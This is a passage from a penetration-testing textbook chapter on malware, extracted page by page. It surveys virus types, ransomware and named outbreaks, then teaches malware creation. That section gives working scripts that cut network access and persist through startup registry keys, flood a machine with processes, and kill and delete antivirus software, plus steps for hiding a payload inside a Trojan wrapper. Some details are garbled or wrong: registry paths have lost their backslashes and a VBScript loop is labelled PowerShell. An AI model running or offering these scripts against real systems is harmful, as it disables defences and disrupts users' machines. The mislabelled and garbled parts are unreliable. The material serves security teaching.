- pgno: 124
  md: '# Malware


    # Chapter Objectives


    After reading this chapter and completing the exercises, you will be able to do
    the following:


    +   - Understand types of malware

    +   - Understand malware creation methodologies

    +   - Understand how malware can be used in pen testing


    Malware is one of the most common threats to any network. It should be obvious
    that any penetration tester needs an understanding of malware in order to combat
    it. In this chapter, however, we will go deeper than merely understanding malware
    and discuss the basics of actually creating malware. That may seem a bit odd to
    some readers. There are two very good reasons for this.


    The first reason for learning how to actually create malware is so that you have
    an intimate knowledge of what malware is for. If you understand what can and cannot
    be done, as well as how malware propagates, you will be better prepared to combat
    malware.


    The second reason is that some benign viruses can be used in penetration testing.
    We will see that in this chapter.


    You should be aware, however, that the material in this chapter should not be
    taken lightly. Creating malware is dangerous. It is possible for malware to accidentally
    spread. So the creation of malware should always be done on an isolated, non-networked
    computer or virtual machine.


    # Viruses


    By definition, a computer virus is a program that self-replicates. Generally,
    a virus will also have some other unpleasant function, but the self-replication
    and rapid spread are the hallmarks of a virus. Often'
  merge: -1
  img_proc: true
- pgno: 125
  md: 'this growth, in and of itself, can be a problem for an infected network. Any
    rapidly spreading virus can reduce the functionality and responsiveness of a network.
    Simply by exceeding the traffic load that a network was designed to carry, the
    network may be rendered temporarily nonfunctional. The infamous I Love You virus
    actually had no negative payload, but the sheer volume of emails it generated
    bogged down many networks.


    # How a Virus Spreads


    A virus will usually spread primarily in one of two ways. The first is via email
    attachment, and the second is simply to upload an infected file to a file sharing
    site, or perhaps a web server. The latter method has no specific delivery mechanism,
    beyond uploading. The first method often involves a little bit of programming.


    Sending viruses via email is still very common. One can use any email client to
    send out a virus, but it is particularly easy when the email client is Microsoft
    Outlook. The reason is not so much a security flaw in Outlook as it is the ease
    of working with Outlook. All Microsoft Office products are made so that a legitimate
    programmer who is writing software for a business can access many of the application’s
    internal objects and thereby easily create applications that integrate the applications
    within the Microsoft Office suite. For example, a programmer could write an application
    that would access a Word document, import an Excel spreadsheet, and then use Outlook
    to automatically email the resulting document to interested parties. Microsoft
    has done a good job of making this process very easy, for it usually takes a minimum
    amount of programming to accomplish these tasks. Using Outlook, it takes less
    than five lines of code to reference Outlook and send out an email. This means
    a program can literally cause Outlook itself to send emails, unbeknownst to the
    user. There are numerous code examples on the Internet that show exactly how to
    do this, free for the taking. For this reason, it does not take a very skilled
    programmer to be able to access your Outlook address book and automatically send
    emails. Essentially, the ease of programming Outlook is why there are so many
    virus attacks that target Outlook.


    While the overwhelming majority of virus attacks spread by attaching themselves
    to the victim’s existing email software, some recent virus outbreaks have used
    other methods for propagation, such as their own internal email engine. Another
    virus propagation method is to simply copy itself across a network. Virus outbreaks
    that spread via multiple routes are becoming more common.


    The method of delivering a payload can be rather simplistic and rely more on end-user
    negligence than on the skill of the virus writer. Enticing users to go to websites
    or open files they should not is a common method for delivering a virus and one
    that requires no programming skill at all. Regardless of the way a virus arrives
    at your doorstep, once it is on your system, it will attempt to spread and, in
    many cases, will also attempt to cause some harm to your system. Once a virus
    is on your system, it can do anything that any legitimate program can do. That
    means it could potentially delete files, change system settings, or cause other
    harm.


    While uploading infected files to a web server/file sharing server, and email
    attachment are the two most common methods, there are other methods for virus
    propagation.'
  merge: -1
  img_proc: true
- pgno: 126
  md: 'Some of these are refinements of the preceding methods. You can see these virus
    propagation methods listed in Figure 5-1.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_126_0.png)


    FIGURE 5-1 Virus Propagation Methods.


    Sending a virus via a messenger application is very much like sending it as an
    email attachment. Using removable media, untrusted sites, and downloads are all
    just variations of uploading the virus to a file sharing website. The Trojan horse
    is an intriguing method. It involves attaching the virus to some benign program,
    and thus tricking the user into installing it themselves. We will see more about
    Trojan horses, including how to create one, later in this chapter.


    # Types of Viruses


    There are many different types of viruses. In this section, we will briefly look
    at some of the major virus types. Viruses can be classified by either their method
    of propagation or their activities on the target computers. It must also be noted
    that various experts differ slightly on how they group viruses. The taxonomy presented
    in this section is rather common, and I find it to be quite useful. It is one
    I have developed over the years.


    # Macro Viruses


    Macro viruses infect the macros in office documents. Many office products, including
    Microsoft Office, allow users to write mini-programs called macros. These macros
    can also be written as a virus. A macro virus is written into a macro in some
    business application. For example, Microsoft Office allows users'
  merge: -1
  img_proc: true
- pgno: 127
  md: 'to write macros to automate some tasks. Microsoft Outlook is designed so that
    a programmer can write scripts using a subset of the Visual Basic programming
    language, called Visual Basic for Applications (VBA). This scripting language
    is, in fact, built into all Microsoft Office products. Programmers can also use
    the closely related VBScript language. Both languages are quite easy to learn.
    If such a script is attached to an email and the recipient is using Outlook, then
    the script can execute. That execution can do any number of things, including
    scanning the address book, looking for addresses, sending out email, deleting
    email, and more.


    # Boot Sector


    Boot sector viruses don’t infect the operating system of the target computer,
    but instead attack the boot sector of the drive. This makes them harder to detect
    and remove with traditional antivirus software. Such software is installed in
    the operating system, and to some extent only operates within the context of the
    operating system. By operating outside the operating system, a boot sector virus
    is harder to detect and remove. Multipartite viruses attack the computer in multiple
    ways, for example, infecting the boot sector of the hard disk and one or more
    files within the operating system.


    # Stealth


    Stealth viruses are one of the largest groups of viruses. This category includes
    any virus that uses one or more techniques to hide itself. In other words, these
    are viruses that are trying to avoid your antivirus software. A list of common
    stealth techniques is shown in Figure 5-2.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_127_0.png)


    FIGURE 5-2 Stealth Virus Types.'
  merge: -1
  img_proc: true
- pgno: 128
  md: 'XOR is the basic binary math operation, exclusive or. Some viruses will XOR
    their binary file with some random number. That renders the virus temporarily
    unusable, but also makes it no longer match known virus signatures. When ready
    to unleash the virus, it is simply XORs again and the original is returned. Obviously,
    this requires a secondary module that performs the XOR operation. However, since
    that is all that module will be tasked with, it is unlikely that it will trigger
    antivirus software.


    Related to the XOR are cryptor viruses that use a secondary module to encrypt
    the virus, then decrypt it when ready for use.


    The Trojan horse is an excellent way to hide a virus. By tying it to a legitimate
    program, it not only will trick the user into installing it, but it may also evade
    antivirus software.


    A polymorphic virus literally changes its form from time to time to avoid detection
    by antivirus software. A more advanced form of this is called the metamorphic
    virus; it can completely change itself. This also requires a secondary module
    to perform the rewriting.


    A sparse infector virus attempts to elude detection by performing its malicious
    activities only sporadically. With a sparse infector virus, the user will see
    symptoms for a short period, then no symptoms for a time. In some cases the sparse
    infector targets a specific program but the virus only executes every 10th time
    or 20th time that target program executes. Or a sparse infector may have a burst
    of activity and then lie dormant for a period of time. There are a number of variations
    on the theme, but the basic principle is the same: to reduce the frequency of
    attack and thus reduce the chances for detection.


    Fragmented payload is a rather sophisticated method of hiding a virus. The virus
    is split into modules. The loader module is rather innocuous and unlikely to trigger
    any antivirus software. It will then download, separately, the other fragments.
    When all fragments are present, the loader will assemble them and unleash the
    virus.


    # Ransomware


    It is impossible in modern times to discuss malware and not discuss ransomware.
    In fact, as I am writing this, in the past 48 hours the world has been hit with
    a massive ransomware attack. It began by attacking healthcare systems in England
    and Scotland, and spread far beyond those. While many people first began discussing
    ransomware with the advent of CryptoLocker in 2013, ransomware has been around
    a lot longer than that. The first known ransomware was the 1989 PC Cyborg Trojan,
    which only encrypted filenames with a weak symmetric cipher.


    In general, ransomware works as a worm, then either disables system services or
    encrypts user files. It then demands a ransom to release those files/service.
    The term worm used to have a different meaning than virus, though the terms are
    often used interchangeably today. A worm is essentially a virus that propagates
    much more readily.


    There are two general categories of ransomware, as shown in Figure 5-3.'
  merge: -1
  img_proc: true
- pgno: 129
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_129_0.png)


    # FIGURE 5-3 Types of Ransomware.


    On August 7, 2016, the first ever ransomware for smart thermostats was reported
    (http://motherboard.vice.com/read/internet-of-things-ransomware-smart-thermostat).
    In this case, fortunately, this was not ransomware found in the wild, but rather
    the creation of two security researchers, designed to illustrate a flaw in smart
    home technology. They demonstrated their proof of concept at the famous DEF CON
    conference in Las Vegas.


    This illustrates an important point. Malware research is a vital and very legitimate
    field of research. Discovering new forms of malware and formulating a response
    to that malware before it is found in the wild is a critical step in cyber security.


    During the writing of this chapter, the WannaCry ransomware outbreak spread all
    over the world. This ransomware depended on computers having an unpatched flaw.
    This illustrates the need for basic patch management, and vulnerability scanning.
    If everyone had good patch management, WannaCry would have caused very little
    damage. Figure 5-4 shows an image of the WannaCry virus.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_129_1.png)


    # FIGURE 5-4 WannaCry.'
  merge: -1
  img_proc: true
- pgno: 130
  md: '# Industrial Viruses


    Industrial viruses target systems such as supervisory control and data acquisition
    (SCADA) systems, which are used in manufacturing, water purification, power plants,
    and other industrial systems. NIST 800-82 is a good place to start studying SCADA
    security. Special Publication 800-82, Revision 2, “Guide to Industrial Control
    System (ICS) Security,” is specific to industrial control systems. Industrial
    systems include SCADA systems and PLCs (primary logic controllers). This document
    begins by examining the threats to these systems, in detail. The standard then
    discusses how to develop a comprehensive security plan for such systems.


    In 2010, the Stuxnet virus was discovered. It was designed to attack programmable
    logic controllers, particularly those in systems used by Iran to refine uranium.
    It was widely speculated that the U.S. government and/or Israel were behind the
    attack.


    # Hardware Trojans


    Hardware Trojans are alterations to firmware in an integrated circuit. Given the
    widespread outsourcing of chip manufacturing, such Trojans could be in any integrated
    circuit. Instances of such Trojans found in the wild have, thus far, been rare.
    But that merely means they have not been detected. And that is logical, as it
    is both harder to create a hardware Trojan and harder to detect it. Since it is
    in a chip, traditional anti-malware approaches will not work.


    Detecting hardware Trojans is quite difficult. There exist established methodologies
    for testing individual chips. For example, destructive measures such as reverse
    engineering the chip can be used to detect Trojans; however, these methods are
    very expensive and require sophisticated equipment such as electron microscopes.
    The more common methodologies involve comparing timing delays and power fluctuations;
    however, such methods depend on a “golden chip” reference to compare the test
    chip to. It is not always possible to have a verified chip to test.


    As already stated, while hardware Trojans are quite rare and some sources claim
    there have been none found “in the wild,” this is not completely accurate. Some
    have been found, but confirmation of the finding is difficult. The systems infected
    tend to be confidential systems, and limited information is available.


    From a penetration testing or security auditing perspective, hardware Trojans
    are a separate issue and should be given their own audit. Most penetration testers
    do not have the skill set to perform tests for hardware Trojans, and most networks
    don’t need testing for hardware Trojans. Therefore, these should be excluded from
    the scope.


    # Virus Examples


    The threat from virus attacks cannot be overstated. While there are many web pages
    that give virus information, in my opinion there are only a handful of web pages
    that consistently give the latest, most reliable, most detailed information on
    virus outbreaks. Any security professional will want to consult'
  merge: -1
  img_proc: true
- pgno: 131
  md: 'these sites on a regular basis. You can read more about any virus, past or
    current, at the following websites:


    +   - http://www.pctools.com/security-news/top-10-computer-viruses/

    +   - https://www.us-cert.gov/publications/virus-basics

    +   - http://www.techrepublic.com/pictures/the-18-scariest-computer-viruses-of-all-time/


    The following sections will look at several real-world virus outbreaks. We will
    examine very recent viruses as well as some examples from 10 or more years in
    the past. This should give you a fairly complete overview of how viruses behave
    in the real world.


    # Rombertik


    Rombertik wreaked havoc in 2015. This malware uses the browser to read user credentials
    to websites. It is most often sent as an attachment to an email. Perhaps even
    worse, in some situations Rombertik will either overwrite the master boot record
    on the hard drive, making the machine unbootable, or begin encrypting files in
    the user’s home directory.


    # Gameover ZeuS


    Gameover ZeuS is a virus that creates a peer-to-peer botnet. Essentially, it establishes
    encrypted communication between infected computers and the command and control
    computer, allowing the attacker to control the various infected computers. In
    2014 the U.S. Department of Justice was able to temporarily shut down communication
    with the command and control computers; then in 2015 the FBI announced a reward
    of $3 million for information leading to the capture of Evgeniy Bogachev for his
    alleged involvement with Gameover ZeuS.


    A command and control computer is the computer used in a botnet to control the
    other computers. These are the central nodes from which a botnet will be managed.


    # CryptoLocker and CryptoWall


    One of the most widely known examples of ransomware is the infamous CryptoLocker,
    first discovered in 2013. CryptoLocker utilized asymmetric encryption to lock
    the user’s files. Several varieties of CryptoLocker have been detected.


    CryptoWall is a variant of CryptoLocker first found in August 2014. It looked
    and behaved much like CryptoLocker. In addition to encrypting sensitive files,
    it would communicate with a command and control server and even take a screenshot
    of the infected machine. By March 2015 a variation of CryptoWall had been discovered
    that is bundled with the spyware TSPY_FAREIT.YOI and actually steals credentials
    from the infected system, in addition to holding files for ransom.


    # FakeAV


    This virus first appeared in July 2012. It affected Windows systems ranging from
    Windows 95 to Windows 7 and Windows server 2003. This was a fake antivirus (thus
    the name FakeAV) that would'
  merge: -1
  img_proc: true
- pgno: 132
  md: 'pop up fake virus warnings. This was not the first such fake antivirus malware,
    but it was one of the more recent ones.


    # MacDefender


    This virus is very interesting for multiple reasons. First, it specifically targets
    Mac computers. Most experts have long agreed that Apple products remained relatively
    virus free simply because their products did not have enough market share to attract
    the attention of virus writers. It has long been suspected that if Apple garnerer
    a greater market share, it would also begin to get more virus attacks. That has
    proven to be true.


    This virus was first seen in the early months of 2011. It is embedded in some
    web pages, and when a user visits one of those web pages, she is given a fake
    virus scan that tells her she has a virus and it needs to be fixed. The “fix”
    is actually downloading a virus. The point of the virus is to get end users to
    purchase the MacDefender “antivirus” product. This is the second reason this case
    is noteworthy. Fake antivirus attacks, also known as scareware, have been becoming
    increasingly common.


    # Troj/Invo-Zip


    This particular worm is a classic worm/Trojan horse that was first reported in
    mid 2010. It is transmitted as a zip file attached to an email. The email claims
    that the zip file contains data related to an invoice, tax issue, or similar urgent
    paperwork. This is a classic example of attempting to entice the recipient to
    open the attachment. And in this case, the recipients most likely to be enticed
    would be businesspeople.


    If the recipient does open the attachment, then he will have installed spyware
    on his machine that would first disable the firewall and then start attempting
    to capture information, including financial data. It even takes screenshots of
    the user’s desktop.


    # Teardrop Ransomware


    First seen in 2016, this ransomware targets the Pokemon Go application for Windows
    and targets Arabic users.


    It scans the drive for sensitive files (any document, spreadsheet, image, or database)
    and encrypts it with AES, appending the .locked extension to the file. The victim
    is then instructed to email me.blackhat20152015@mt2015.com to get payment instructions.
    It also adds a backdoor Windows account, spreading the executable to other drives,
    and creating network shares.


    It then hides this account from being seen on the Windows login screen by configuring
    the following Windows registry key: KEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\UserList “Hack3r” = 0.


    It also adds a network share on the infected computer. It is not yet known what
    this share is for.'
  merge: -1
  img_proc: true
- pgno: 133
  md: '# Flame


    No modern discussion of viruses would be complete without a discussion of Flame.
    This virus, which first appeared in 2012, targeted Windows operating systems.
    The first item that makes this virus notable is that it was specifically designed
    by the U.S. government for espionage. Many sources, including the Washington Post,
    UK Telegraph, and Reuters, have all stated that Flame was created by the U.S.
    government. It was discovered in May 2012 at several locations, including Iranian
    government sites. Flame is spyware that can monitor network traffic and take screenshots
    of the infected system.


    # Trojan Horses


    Recall from earlier chapters that *Trojan horse* is a term for a program that
    looks benign but actually has a malicious purpose. We have already seen viruses
    that are delivered via a Trojan horse. You might receive or download a program
    that appears to be a harmless business utility or game. More likely, the Trojan
    horse is just a script attached to a benign-looking email. When you run the program
    or open the attachment, it does something else other than or in addition to what
    you thought it would. It might


    +   - Download harmful software from a website.

    +   - Install a key logger or other spyware on your machine.

    +   - Delete files.

    +   - Open a backdoor for a hacker to use.


    It is common to find combination virus plus Trojan horse attacks. In those scenarios,
    the Trojan horse spreads like a virus. The MyDoom virus opened a port on your
    machine that a later virus, doomjuice, would exploit, thus making MyDoom a combination
    virus and Trojan horse.


    A Trojan horse could also be crafted especially for an individual. If a hacker
    wished to spy on a certain individual, such as the company accountant, he could
    craft a program specifically to attract that person’s attention. For example,
    if he knew the accountant was an avid golfer, he could write a program that computed
    handicap and listed best golf courses. He would post that program on a free web
    server. He would then email a number of people, including the accountant, telling
    them about the free software. The software, once installed, could check the name
    of the currently logged-on person. If the logged-on name matched the accountant’s
    name, the software could then go out, unknown to the user, and download a key
    logger or other monitoring application. If the software'
  merge: -1
  img_proc: true
- pgno: 134
  md: 'did not damage files or replicate itself, then it would probably go undetected
    for quite a long time. There have been a number of Trojan horses through the years.
    One of the earliest and most widely known was Back Orifice.


    Such a program could be within the skill set of virtually any moderately competent
    programmer. This is one reason that many organizations have rules against downloading
    any software onto company machines. I am unaware of any actual incident of a Trojan
    horse being custom tailored in this fashion. However, it is important to remember
    that those creating virus attacks tend to be innovative people.


    It is also important to note that creating a Trojan horse does not require programming
    skill. There are free tools on the Internet, such as EliteWrapper, that allow
    someone to combine two programs, one hidden and one not. So one could easily take
    a virus and combine it with, for example, a poker game. The end user would only
    see the poker game, but when it was run it would launch the virus.


    Another scenario to consider is one that would be quite devastating. Without divulging
    programming details, the basic premise will be outlined here to illustrate the
    grave dangers of Trojan horses. Imagine a small application that displays a series
    of unflattering pictures of Osama Bin Laden. This application would probably be
    popular with many people in the United States, particularly people in the military,
    intelligence community, or defense-related industries. Now assume that this application
    simply sits dormant on the machine for a period of time. It need not replicate
    like a virus because the computer user will probably send it to many of his associates.
    On a certain date and time, the software connects to any drive it can, including
    network drives, and begins deleting all files. If such a Trojan horse were released
    “in the wild,” within 30 days it would probably be shipped to thousands, perhaps
    millions, of people. Imagine the devastation when thousands of computers begin
    deleting files and folders.


    This scenario is mentioned precisely to frighten you a little. Computer users,
    including professionals who should know better, routinely download all sorts of
    things from the Internet, such as amusing flash videos and cute games. Every time
    an employee downloads something of this nature, there is the chance of downloading
    a Trojan horse. One need not be a statistician to realize that if employees continue
    that practice long enough, they will eventually download a Trojan horse onto a
    company machine. If they do, hopefully the virus will not be as vicious as the
    theoretical one just outlined here.


    Because Trojan horses are usually installed by users themselves, the security
    countermeasure for this attack is to prevent downloads and installations by end
    users. From a law enforcement perspective, the investigation of a crime involving
    a Trojan horse would involve a forensic scan of the computer hard drive, looking
    for the Trojan horse itself.'
  merge: -1
  img_proc: true
- pgno: 135
  md: '# Other Forms of Malware


    This chapter discusses the most prominent forms of malware. Many other forms of
    attack exist, however. It is beyond the scope of this book to explore each of
    these, but you should be aware of the existence of these other forms of malware.
    Simply being aware can go a long way toward enabling you to defend your system
    efficiently. This section will touch upon just a few other forms of malware.


    # Rootkit


    A *rootkit* is software used to obtain administrator-level access to a computer
    or computer network. The intruder installs a rootkit on a computer after first
    obtaining user-level access, either by exploiting a known vulnerability or cracking
    a password. Or the rootkit can be delivered in the same manner as any virus. The
    rootkit then collects user IDs and passwords to other machines on the network,
    thus giving the hacker root or privileged access.


    A rootkit may consist of utilities that also:


    +   - Monitor traffic and keystrokes

    +   - Create a backdoor into the system for the hacker’s use

    +   - Alter log files

    +   - Attack other machines on the network

    +   - Alter existing system tools to circumvent detection


    The presence of a rootkit on a network was first documented in the early 1990s.
    At that time, Sun and Linux operating systems were the primary targets for a hacker
    looking to install a rootkit. Today, rootkits are available for a number of operating
    systems and are increasingly difficult to detect on any network.


    # Malicious Web-Based Code


    A *malicious web-based code*, also known as a *web-based mobile code*, simply
    refers to a code that is portable to all operating systems or platforms such as
    HTTP, Java, and so on. The “malicious” part implies that is it a virus, worm,
    Trojan horse, or some other form of malware. Simply put, the malicious code does
    not care what the operating system may be or what browser is in use. It infects
    them all blindly.'
  merge: -1
  img_proc: true
- pgno: 136
  md: 'Where do these codes come from, and how are they spread? The first generation
    of the Internet was mostly indexed text files. However, as the Internet has grown
    into a graphical, multimedia user experience, programmers have created scripting
    languages and new application technologies to enable a more interactive experience.
    As with any new technology, programs written with scripting languages run the
    gamut from useful to poorly crafted to outright dangerous.


    Technologies such as Java and ActiveX enable these buggy or untrustworthy programs
    to move to and execute on user workstations. (Other technologies that can enable
    malicious code are executables, JavaScript, Visual Basic Script, and plug-ins.)
    The Web acts to increase the mobility of code without differentiating between
    program quality, integrity, or reliability. Using available tools, it is quite
    simple to “drag and drop” code into documents that are subsequently placed on
    web servers and made available to employees throughout the organization or individuals
    across the Internet. If this code is maliciously programmed or just improperly
    tested, it can cause serious damage.


    Not surprisingly, hackers have used these very useful tools to steal, alter, and
    erase data files as well as gain unauthorized access to corporate networks. A
    malicious code attack can penetrate corporate networks and systems from a variety
    of access points, including websites, HTML content in email messages, or corporate
    intranets.


    Today, with billions of Internet users, new malicious code attacks can spread
    almost instantly through corporations. The majority of damage caused by malicious
    code happens in the first hours after a first-strike attack occurs—before there
    is time for countermeasures. The costs of network downtime or theft of intellectual
    property (IP) make malicious code a top priority.


    # Logic Bombs


    A logic bomb is a type of malware that executes its malicious purpose when a specific
    criteria is met. The most common factor is date/time. For example, a logic bomb
    might delete files on a certain date/time. An example is the case of Roger Duronio.
    In June 2006, Roger Duronio, a system administrator for UBS, was charged with
    using a logic bomb to damage the company’s computer network. His plan was to drive
    the company stock down due to damage from the logic bomb, so he was charged with
    securities fraud. Duronio was later convicted and sentenced to 8 years and 1 month
    in prison and ordered to pay $3.1 million restitution to UBS.


    Another example occurred at the mortgage company Fannie Mae. On October 29, 2008,
    a logic bomb was discovered in the company’s systems. This logic bomb had been
    planted by a former contractor, Rajendrasinh Makwana, who had been terminated.
    The bomb was set to activate on January 31, 2009 and completely wipe all of the
    company’s servers. Makwana was indicted in a Maryland court on January 27, 2009
    for unauthorized computer access. On December 17, 2010 he was convicted and sentenced
    to 41 months in prison, followed by 3 years of probation after release. What is
    most interesting about this case is that Makwana planted the logic bomb between
    the time he was terminated and the time the network administrators cancelled his
    network access.'
  merge: -1
  img_proc: true
- pgno: 137
  md: 'This illustrates the importance of ensuring that the accounts of former employees
    are deactivated immediately when their employment is terminated. That applies
    whether it is an involuntary termination, retirement, or voluntary quit.


    # Creating Malware


    This section examines a number of methods that will allow you to create various
    types of malware. It should be noted that this should be done with some care.
    Our goal, as penetration testers, is not to wreak havoc on the target network—quite
    the opposite. There is a twofold reason for learning basic malware writing skills.
    The first is so that you will better understand the threat that malware poses.
    If you can write a simple virus yourself, then you know how easy it is to do,
    and you understand why malware is so prevalent. A second reason is that in some
    cases, innocuous malware can be useful as part of a penetration test. As we examine
    various examples, I will point out scenarios to use malware as part of a pen test,
    and scenarios which should never be used.


    In later chapters, we will be spending significant time exploring Metasploit.
    That will also give you the opportunity to embed exploits into PDFs, executables,
    and other files, thus effectively creating malware.


    # Levels of Malware Writing Skill


    As you can imagine, simply reading a single chapter in a single book will not
    make you a master of malware creation. To truly master writing malware, you will
    need significant programming expertise; however, in this chapter we will explore
    some basic techniques. But first let us define the skill levels of malware creators.


    +   1. The lowest skill level are those using GUI tools. There are, in fact, a
    wide range of tools you can use to create simple malware. Anyone can download
    these tools from the Internet and in a few short minutes have their own malware
    created. This requires no programming skills at all. However, it should be noted
    that malware created in this fashion has a significant chance of being detected
    by antivirus software.

    +   2. The next level up are those using batch files and simple scripts. These
    require rudimentary script writing skills, very basic programming. They may or
    may not be detected by antivirus software. They are often useful in penetration
    tests.

    +   3. The third level up are those who take existing malware code and modify
    it. There exist a number of online repositories where one can download the source
    code for well-known viruses such as *Melissa* and *I Love You*. Then you only
    need to make a few modifications to create your own virus.

    +   4. The fourth level involves more substantial programming, because you create
    the entire virus from scratch. Such a new virus is far less likely to be detected
    by antivirus software, at least at first.

    +   5. The ultimate level is to create malware that is both stealthy and self-destructs
    when no longer needed. Obviously, this requires sophisticated programming skills
    and is far less common.'
  merge: -1
  img_proc: true
- pgno: 138
  md: 'The preceding skill list hierarchy is my own creation, but one I find quite
    useful. It is important to note that the skill level of the malware writer is
    proportional to the sophistication of the malware produced.


    # GUI Tools


    There are a number of tools that have a graphical user interface (GUI) that allow
    one to quickly and easily create a basic virus. It should be noted that these
    tools usually produce viruses that are not subtle, and are likely to be detected
    by antivirus software. One of the best known such tools is TeraBIT Virus Maker,
    shown in Figure 5-5.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_138_0.png)


    FIGURE 5-5 TeraBIT Virus Maker.


    Another interesting GUI virus maker is Virus Maker from BlackHost http://www.blackhost.xyz,
    as shown in Figure 5-6. There are several interesting things about this tool.
    In addition to the normal things (like changing mouse behavior), it can open a
    website. This makes it useful for penetration testing. You can have it simply
    open a website that describes why one should be careful with attachments.'
  merge: -1
  img_proc: true
- pgno: 139
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_139_0.png)


    FIGURE 5-6 Virus Maker.


    Less benign functionality includes the ability to launch a batch file (we examine
    batch file viruses in the next section), change the password, delete a file, or
    launch a program.


    There are many other such kits, including:


    +   - Deadly Virus Maker

    +   - Bhavesh Virus Maker

    +   - DeadLine’s Virus Maker


    The presence of such tools helps provide some explanation as to why viruses are
    so prevalent. It is easy for someone to create a virus, even if that person has
    no programming skills.


    # Simple Script Viruses


    Scripts and batch files are very easy to write. They do not require significant
    programming skills, and virtually anyone with even rudimentary skills can write
    a virus. Even without such skills, one can easily acquire sufficient script writing
    skills. A few are shown in this section.'
  merge: -1
  img_proc: true
- pgno: 140
  md: '# VBS Virus


    This virus is particularly useful for penetration testing, as it causes no harm
    to the target computer. Instead, it simply embarrasses the computer operator by
    pointing out that they downloaded an attachment:


    ```

    ```vb

    Dim msg, sapi

    msg="You have violated security policies"

    Set sapi=CreateObject("sapi.spvoice")

    sapi.Speak msg

    ```

    ```


    You can, of course, alter the message to suit your needs. A bit of investigation
    online into the Microsoft Speech API will also show you some additional variations
    you can consider. A few would be


    ```

    ```vb

    sapi.Volume = 100

    sapi.voice = .getvoices.item(0)

    ```

    ```


    These are just a few ways to modify it. This is a VBScript, so you should save
    it as a .vbs file. The concept you are testing is whether or not users will click
    on an attachment, particularly one that is a script.


    # Disable the Internet


    Window’s batch files are also vehicles for virus creation. A series of batch commands
    can wreak havoc on a machine, as significantly as any other malware you may have
    seen. Here is just one example, a batch file that turns off all Internet connectivity:


    ```

    ```bat

    echo @echo off>c:\windowswimm32.bat

    echo break off>>c:\windowswimm32.bat

    echo ipconfig/release_all>>c:\windowswimm32.bat

    echo end>>c:\windowswimm32.bat

    reg add

    hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun

    /v WINDOWSAPI /t reg_sz /d c:\windowswimm32.bat /f

    reg add

    hkey_current_usersoftwaremicrosoftwindowscurrentversionrun

    /v CONTROLEXit /t reg_sz /d c:\windowswimm32.bat /f

    ```

    ```


    Note that this batch file echos what it is doing to the screen. You probably would
    want to turn that off if you wished this to run on someone’s computer.


    # Endless Loop Script


    This is one of the simplest scripts around. It simply starts an infinite number
    of some particular executable, consuming system resources:


    ```

    ```bat

    @ECHO off

    :top

    START %SystemRoot%\system32\notepad.exe

    GOTO top

    ```

    ```


    You can use notepad, calc, anything you like. But it keeps launching copies until
    the system is locked up.'
  merge: -1
  img_proc: true
- pgno: 141
  md: '# Antivirus Killer


    This particular batch file will only work if the person executing it has local
    administrator privileges. But fortunately, for the malware writer, many people
    do their day-to-day computer activities while logged on with administrative privileges.


    This batch file depends on the command tskill, which will end a process. You can
    use the process ID or process name. For example, the following will kill antivirus
    processes:


    ```

    tskill /A ZONEALARM

    tskill /A mcafe*

    ```


    This can be followed with del to delete the files for that antivirus, such as:


    ```

    del /Q /F C:\Program Files\kasper~1\*.exe

    del /Q /F C:\Program Files\kaspersky\*.*

    Note /Q Quiet mode, do not give a Yes/No Prompt before deleting.

    /F Ignore read-only setting and delete anyway (FORCE)

    ```


    Later versions of Windows don’t support tskill, but will support a related command
    taskkill. taskkill is actually more powerful than tskill, so you may wish to use
    it anyway.


    Parameters are listed here:


    +   - **/s Computer:** You can specify a computer name or IP address and attempt
    to kill a task on it. The default is the current computer.

    +   - **/u User:** This will run the command under a specific user’s privileges.
    You will need /p password with this.

    +   - **/pid:** Process ID of the task you wish to kill.

    +   - **/im:** The image name (i.e. the executable name).

    +   - **/t:** Terminate all child processes of the process you are killing.


    You may not wish to use a batch file for malware. It is actually rather simple
    to convert a batch file into an executable file. The website http://www.blackhost.xyz
    has a batch to exe free download.


    # PowerShell


    PowerShell is a wonderful addition to Windows. It is Microsoft’s attempt to match
    the power of the Linux Bash shell. It first was introduced with Windows 7 and
    is on all subsequent versions of Windows. It is a powerful tool used by administrators
    to execute a variety of Windows functions. It can also be useful for hacking.


    In Windows 7 or Windows Server 2008 you get to PowerShell by Start > All Programs
    > Accessories > Windows PowerShell. In Windows 8 or 10 you can just type “Powershell”
    into the search box. You can see the PowerShell interface in Figure 5-7.'
  merge: -1
  img_proc: true
- pgno: 142
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_142_0.png)


    FIGURE 5-7 PowerShell.


    The following is a rather annoying but simple PowerShell virus script:


    ```

    ```

    Set wshShell = wscript.CreateObject("WScript.Shell")

    do

    wscript.sleep 100

    wshshell.sendkeys "~(enter)"

    loop

    ```

    ```


    It keeps pressing the Enter key every 100 milliseconds. You can replace this with
    any other key.


    # Creating a Trojan Horse


    There are a number of tools, some free for download, that will help a person create
    a Trojan horse. One that I use in my penetration testing classes is eLiTeWrap.
    Note that finding this on the Internet will take a bit of searching; its location
    is not stable. It is easy to use. Essentially, it can bind any two programs together.
    Using a tool such as this one, anyone can bind a virus or spyware to an innocuous
    program such as a shareware poker game. This would lead to a large number of people
    downloading what they believe is a free game and unknowingly installing malware
    on their own system. Figure 5-8 illustrates the Trojan horse components.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_142_1.png)


    FIGURE 5-8 Trojan Horse Components.'
  merge: -1
  img_proc: true
- pgno: 143
  md: 'The eLiTeWrap tool is a command-line tool, but it is very easy to use. Just
    follow these steps:


    STEP 1. Enter the file you want to run that is visible.


    STEP 2. Enter the operation:


    +   1. Pack only

    +   2. Pack and execute, visible, asynchronously

    +   3. Pack and execute, hidden, asynchronously

    +   4. Pack and execute, visible, synchronously

    +   5. Pack and execute, hidden, synchronously

    +   6. Execute only, visible, asynchronously

    +   7. Execute only, hidden, asynchronously

    +   8. Execute only, visible, synchronously

    +   9. Execute only, hidden, synchronously


    STEP 3. Enter the command line.


    STEP 4. Enter the second file (the item you are surreptitiously installing).


    STEP 5. Enter the operation.


    STEP 6. When done with files, press Enter.


    Figure 5-9 illustrates this process in eLiTeWrap.


